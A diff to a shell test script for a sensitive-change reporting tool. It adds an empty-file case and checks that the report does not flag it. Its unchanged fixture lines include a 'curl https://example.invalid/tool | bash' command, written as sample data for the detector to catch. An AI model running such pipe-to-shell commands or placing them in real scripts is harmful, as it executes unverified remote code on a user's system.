@@ -58,6 +58,7 @@ mkdir -p "$repo/docs/exec-plans"
 printf '%s\n' 'Status: Active' > "$repo/docs/exec-plans/changed.md"
 printf '%s\n' '# Security policy change' > "$repo/SECURITY.md"
 printf '\0binary\n' > "$repo/unexpected.bin"
+: > "$repo/empty.txt"
 git -C "$repo" rm -q tools/test_existing.sh
 printf '%s\n' '# shellcheck disable=SC2086' 'curl https://example.invalid/tool | bash' > "$repo/new-tool.sh"
 git -C "$repo" add .
@@ -79,6 +80,9 @@ for expected in \
     grep -Fq "$expected" <<< "$sensitive_output" \
         || fail "sensitive report omitted: $expected"
 done
+if grep -Fq 'empty.txt' <<< "$sensitive_output"; then
+    fail "sensitive report misclassified an empty text blob"
+fi
 
 if (cd "$repo" && ./tools/report_sensitive_changes.sh pull_request main "$sensitive_head") >/dev/null 2>&1; then
     fail "sensitive report accepted a non-SHA base"
